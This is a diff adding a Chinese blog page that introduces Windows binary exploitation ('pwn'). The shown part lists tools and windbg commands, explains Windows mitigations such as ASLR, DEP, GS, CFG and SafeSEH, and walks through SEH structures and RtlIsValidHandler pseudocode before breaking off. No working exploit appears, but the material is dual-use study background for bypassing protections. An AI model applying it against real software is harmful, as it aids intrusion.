@@ -1,0 +1,1055 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="l1s00t">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Windows Pwn安装工具pwntools：https:&#x2F;&#x2F;github.com&#x2F;Gallopsled&#x2F;pwntools winpwn：https:&#x2F;&#x2F;github.com&#x2F;S3cur3Th1sSh1t&#x2F;WinPwn checksec https:&#x2F;&#x2F;github.com&#x2F;Wenzel&#x2F;checksec.py 用法类似于linux上的checksec，github直接下载release版本即可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows-pwn入门">
+<meta property="og:url" content="http://example.com/2024/02/06/windows-pwn%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Windows Pwn安装工具pwntools：https:&#x2F;&#x2F;github.com&#x2F;Gallopsled&#x2F;pwntools winpwn：https:&#x2F;&#x2F;github.com&#x2F;S3cur3Th1sSh1t&#x2F;WinPwn checksec https:&#x2F;&#x2F;github.com&#x2F;Wenzel&#x2F;checksec.py 用法类似于linux上的checksec，github直接下载release版本即可">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205203443355.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20201027213119896.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205215313462.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205234527868.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205235331338.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/14931297820310.jpg">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205222612190.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205223304423.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205223514074.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205231256675.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205232137909.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205234527868.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205235331338.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205233248315.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205233307698.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206000424119.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206000648008.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206001423546.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206001552448.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206001825423.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206001943300.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206002112658.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206002510104.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206002621932.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206003416496.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240201204441552.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240201191320432.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206151216330.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206151252996.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206004833315.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206005016234.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206005047214.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206010439612.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206010930889.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206011008164.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206011251041.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206011537354.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240202152944501.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206012036671.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206014742407.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206015115496.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206015320731.png">
+<meta property="og:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206020022971.png">
+<meta property="article:published_time" content="2024-02-06T08:38:36.000Z">
+<meta property="article:modified_time" content="2024-02-06T08:44:19.465Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205203443355.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>windows-pwn入门 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>l1s00t</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="windows-pwn入门"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-06 16:38" pubdate>
+          2024年2月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          25k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          106 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">windows-pwn入门</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2024年2月6日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Windows-Pwn"><a href="#Windows-Pwn" class="headerlink" title="Windows Pwn"></a>Windows Pwn</h1><h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><p><strong>pwntools</strong>：<a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a></p>
+<p><strong>winpwn</strong>：<a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/WinPwn">https://github.com/S3cur3Th1sSh1t/WinPwn</a></p>
+<p><strong>checksec</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Wenzel/checksec.py">https://github.com/Wenzel/checksec.py</a></p>
+<p>用法类似于linux上的checksec，github直接下载release版本即可。</p>
+<p><strong>win_server</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ex-Origin/win_server">https://github.com/Ex-Origin/win_server</a></p>
+<p>EX师傅写的远程交互工具，可以将程序映射到某一个端口上，从而实现与pwntools进行交互。</p>
+<p><strong>windbg</strong></p>
+<p>windows上功能强大的调试工具。微软商店搜windbg，或者搜索windbg preview，直接安装即可。</p>
+<p>常用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">bp	# 设置断点<br>bl	# 查看断点<br>bc	# 清除下的断点<br><br>g	# 执行到下一个断点处<br>p	# 单步执行，步过函数<br>t	# 单步执行，步进函数<br><br>k	# 显示当前调用栈信息<br>r	# 查看寄存器的值<br>x	# 查看符号地址 例如：x ucrtbase!read<br>d	# 查看指定地址内存，有db, dw, dd, dq等几种形式	例如：dd esp L20<br>da	# 使用ascii形式查看指定地址内容，即查看字符串内容<br>dds	# 以更好的形式查看指定地址内存<br>u	# 查看指定地址汇编<br>lm	# 列出所有加载的模块及其基址<br><br>.sympath	# 显示windbg当前符号查找路径<br>.reload		# 为当前所有模块载入符号信息	/f 强制载入	/v 详细模式<br><br>!address	# 显示地址的内存属性<br>!exchain	# 显示当前线程的异常处理链(seh)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>这里基础知识主要参考<a target="_blank" rel="noopener" href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">A1ex师傅</a>的博客。为了加深记忆，在此再记录一遍。</p>
+<h3 id="windows保护机制"><a href="#windows保护机制" class="headerlink" title="windows保护机制"></a>windows保护机制</h3><p>以checksec检测结果为例，介绍windows常用保护机制。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205203443355.png" srcset="/img/loading.gif" lazyload alt="image-20240205203443355"></p>
+<ul>
+<li><code>ASLR</code></li>
+</ul>
+<p>与 <code>Linux</code>相同，在程序启动时将 <code>DLL</code>随机加载到内存中的位置，这将缓解恶意程序的加载。<code>ASLR</code> 在 <code>Windows10</code>后开始在系统中被配置为默认启用。</p>
+<ul>
+<li><code>High Entropy VA</code></li>
+</ul>
+<p>称为 高熵64位地址空间布局随机化，开启后，表示此程序的地址随机化的取值空间为64bit，这会导致攻击者更难去推测随机化后的地址。</p>
+<ul>
+<li><code>Force Integrity</code></li>
+</ul>
+<p>这个保护被称为强制签名保护，一旦开启，表示此程序加载时需要验证其中的签名，如果签名不正确，程序将会被组织运行。</p>
+<ul>
+<li><code>Isolation</code></li>
+</ul>
+<p>被称为隔离保护，一旦开启，表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限。</p>
+<ul>
+<li><code>NX/EDP/PAE</code></li>
+</ul>
+<p><code>NX</code>指内存页不可运行，操作系统能够将一页或多页内存标记为不可执行，从而防止从该内存区域运行代码，以帮助防止缓冲区溢出。防止代码在数据页面（例如堆、栈和内存池）中运行，在<code>Windows</code>中常称为 <code>DEP</code>。</p>
+<p><code>PAE</code>(物理地址扩展，即 <code>Physical Address Extension</code>)，是一项处理器功能，使 <code>x86</code> 处理器可以在部分 <code>Windows</code>版本上访问 <code>4GB</code>以上的物理内存。在基于 <code>x86</code>的系统上运行某些 32位 版本的 <code>Windows Server</code>可以使用 <code>PAE</code>访问最多 <code>64 GB</code> 或 <code>128 GB</code>的物理内存，具体取决于处理器的物理地址大小。使用 <code>PAE</code>，操作系统将从两级线性地址转换为三级地址转换。两级线性地址转换将线性地址拆分为3个独立的字段索引到内存表中，三级地址转换将其拆分成4个独立项的字段：一个2位的字段，两个9位的字段和一个12位的字段。<code>PAE</code>模式下的页表条目 <code>PTE</code> 和 页目录条目 <code>PDE</code>的大小从32位增加到64位。附加允许操作系统 <code>PTE</code>或 <code>PDE</code>引用4 GB以上的物理内存。同时，<code>PAE</code>将允许在基于 <code>x86</code> 的系统上运行的32位 <code>Windows</code>中启用 <code>EDP</code>等功能。</p>
+<ul>
+<li><code>SEHOP</code></li>
+</ul>
+<p>即结构化异常处理保护，能够防止攻击者利用结构化异常处理来进行进一步的利用。</p>
+<ul>
+<li><code>CFG</code></li>
+</ul>
+<p>控制流防护，在间接跳转前插入校验代码，检查目标地址的有效性，进而可以组织执行流跳转到预期之外的地点，最终及时有效的进行异常处理。</p>
+<ul>
+<li><code>RFG</code></li>
+</ul>
+<p>返回地址防护，在每个函数头部将返回地址保存到 <code>fs:[rsp](Thread Control Stack)</code>，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止了这些攻击方式。</p>
+<ul>
+<li><code>SafeSEH</code></li>
+</ul>
+<p>安全结构化异常处理函数，即白名单安全沙箱，事先定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序正式运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行。</p>
+<ul>
+<li><code>GS</code></li>
+</ul>
+<p>类似 <code>Canary</code>保护，一旦开启会在返回地址和<code>BP</code>之前压入一个额外的 <code>Security Cookie</code>。系统会比较栈中的这个值和原先存放在 <code>.data</code>中的值做一个比较。</p>
+<ul>
+<li><code>Authenticode</code></li>
+</ul>
+<p>签名保护。</p>
+<ul>
+<li><code>.NET</code></li>
+</ul>
+<p><code>DLL</code>混淆级保护。</p>
+<h3 id="SEH机制"><a href="#SEH机制" class="headerlink" title="SEH机制"></a>SEH机制</h3><p><code>SEH</code>是<code>Windows</code>操作系统对 C&#x2F;C++ 程序做的语法拓展，用于处理异常事件的程序控制结构。硬件异常是<code>CPU</code>抛出的如除0、数值溢出、内存访问错误等；软件异常是操作系统与程序通过 <code>RaiseException</code>语句抛出的异常。<code>Windows</code>拓展了C语言的语法，用 <code>try-except</code>与 <code>try-finally</code> 语句来处理异常。异常处理程序可以释放已经获取的资源、显示出错信息与程序内部状态，供调试、错误恢复、尝试重新执行出错的代码或者关闭程序等。一个 <code>__try</code> 语句不能既有 <code>__except</code>，又有 <code>__finally</code>，但 <code>try-except</code>与 <code>try-finally</code>语句可以嵌套使用。</p>
+<h4 id="TIB-x2F-TEB结构体"><a href="#TIB-x2F-TEB结构体" class="headerlink" title="TIB&#x2F;TEB结构体"></a>TIB&#x2F;TEB结构体</h4><p><code>TIB</code>线程信息块，是保存线程基本信息的数据结构，存在于 <code>x86</code>的机器上，也被称为是 <code>Win32</code>的 <code>TEB(Thread Environment Block)</code>线程环境快。是操作系统为了保存每个现成的私有数据创建的，每个线程都有自己的 <code>TIB/TEB</code>。</p>
+<p><code>TEB</code>结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">TEB</span> &#123;</span><br>  PVOID Reserved1[<span class="hljs-number">12</span>];<br>  PPEB  ProcessEnvironmentBlock;<br>  PVOID Reserved2[<span class="hljs-number">399</span>];<br>  BYTE  Reserved3[<span class="hljs-number">1952</span>];<br>  PVOID TlsSlots[<span class="hljs-number">64</span>];<br>  BYTE  Reserved4[<span class="hljs-number">8</span>];<br>  PVOID Reserved5[<span class="hljs-number">26</span>];<br>  PVOID ReservedForOle;<br>  PVOID Reserved6[<span class="hljs-number">4</span>];<br>  PVOID TlsExpansionSlots;<br>&#125; TEB, *PTEB;<br></code></pre></td></tr></table></figure>
+
+<p><code>TIB</code>结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Code in https://source.winehq.org/source/include/winnt.h#2635</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">NT_TIB</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="hljs-title">Exceptionlist</span>;</span> <span class="hljs-comment">// 指向当前线程的 SEH</span><br>    PVOID StackBase;    <span class="hljs-comment">// 当前线程所使用的栈的栈底</span><br>    PVOID StackLimit;   <span class="hljs-comment">// 当前线程所使用的栈的栈顶</span><br>    PVOID SubSystemTib; <span class="hljs-comment">// 子系统</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        PVOID FiberData;<br>        ULONG Version;<br>    &#125;;<br>    PVOID ArbitraryUserPointer;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">NT_TIB</span> *<span class="hljs-title">Self</span>;</span> <span class="hljs-comment">//指向TIB结构自身</span><br>&#125; NT_TIB;<br><br><span class="hljs-comment">//  Code in https://source.winehq.org/source/include/winnt.h#2623</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="hljs-title">Next</span>;</span> <span class="hljs-comment">// 指向下一个结构的指针</span><br>    PEXCEPTION_ROUTINE Handler; <span class="hljs-comment">// 当前异常处理回调函数的地址</span><br>&#125;EXCEPTION_REGISTRATION_RECORD;<br></code></pre></td></tr></table></figure>
+
+<p>在这个结构中与异常处理有关的成员是指向 <code>_EXCEPTION_REGISTRATION_RECORD</code>结构的 <code>Exceptionlist</code>指针，<strong>注意</strong> 异常处理链表位于 <code>TIB</code>的链表头。</p>
+<p><code>_EXCEPTION_REGISTRATION_RECORD</code>结构体主要用于描述线程异常处理句柄的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系。在windbg中可以使用<code>!exchain</code> 命令显示此结构。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20201027213119896.png" srcset="/img/loading.gif" lazyload alt="image-20201027213119896"></p>
+<p><strong>注意</strong>：<code>fs</code> 寄存器指向 <code>TEB</code>结构，<code>Next</code>指针指向 <code>0xFFFFFFFF</code>，表示<code>SEH</code>链结束。</p>
+<h4 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h4><p>SafeSEH是针对SEH异常处理的保护机制，自微软Windos XP SP2引入。</p>
+<p>在程序调用异常处理函数前，对要调用的异常处理函数进行一系列有效性校验，当发现异常处理函数不可靠时，将终止异常处理函数的调用。</p>
+<p>windows 10异常处理的调用链大致如下：</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240205215313462.png" srcset="/img/loading.gif" lazyload alt="image-20240205215313462"></p>
+<p>当发生异常时，操作系统调用<code>RtlDispatchException</code>进行检测：</p>
+<ul>
+<li>如果异常处理链<strong>不在当前程序的栈中</strong>，则终止异常处理调用</li>
+<li>如果异常处理函数的<strong>指针指向当前程序的栈中</strong>，则终止异常处理调用</li>
+<li>如果前两项检查通过后（SEH的链在栈中，函数不在），则调用<code>RtlIsValidHandler</code>进行异常处理有效性检查</li>
+</ul>
+<p><code>RtlIsValidHandler</code>会判断异常处理函数地址的合法性，其伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">RtlIsValidHandler</span><span class="hljs-params">(handler)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (handler is in an image) <span class="hljs-comment">// step 1</span><br>    &#123;<br>        <span class="hljs-comment">// 在加载模块的进程空间</span><br>        <span class="hljs-keyword">if</span> (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="hljs-built_in">set</span>)<br>            <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// 该标志设置，忽略异常处理，直接返回FALSE</span><br> <br>        <span class="hljs-keyword">if</span> (image has a SafeSEH table) <span class="hljs-comment">// 是否含有SEH表</span><br>            <span class="hljs-keyword">if</span> (handler found in the table)<br>                <span class="hljs-keyword">return</span> TRUE; <span class="hljs-comment">// 异常处理handle在表中，返回TRUE</span><br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// 异常处理handle不在表中，返回FALSE</span><br> <br>        <span class="hljs-keyword">if</span> (image is a .NET assembly with the ILonly flag <span class="hljs-built_in">set</span>)<br>            <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// .NET 返回FALSE</span><br>        <span class="hljs-comment">// fall through</span><br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (handler is on a non-executable page) <span class="hljs-comment">// step 2</span><br>    &#123;<br>             <span class="hljs-comment">// handle在不可执行页上面</span><br>        <span class="hljs-keyword">if</span> (ExecuteDispatchEnable bit <span class="hljs-built_in">set</span> in the process flags)<br>            <span class="hljs-keyword">return</span> TRUE; <span class="hljs-comment">// DEP关闭，返回TRUE；否则抛出异常</span><br>        <span class="hljs-keyword">else</span><br>            raise ACCESS_VIOLATION; <span class="hljs-comment">// enforce DEP even if we have no hardware NX</span><br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (handler is not in an image) <span class="hljs-comment">// step 3</span><br>    &#123;<br>             <span class="hljs-comment">// 在加载模块内存之外，并且是可执行页</span><br>        <span class="hljs-keyword">if</span> (ImageDispatchEnable bit <span class="hljs-built_in">set</span> in the process flags)<br>            <span class="hljs-keyword">return</span> TRUE; <span class="hljs-comment">// 允许在加载模块内存空间外执行，返回验证成功</span><br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// don&#x27;t allow handlers outside of images</span><br>    &#125;<br> <br>    <span class="hljs-comment">// everything else is allowed</span><br>    <span class="hljs-keyword">return</span> 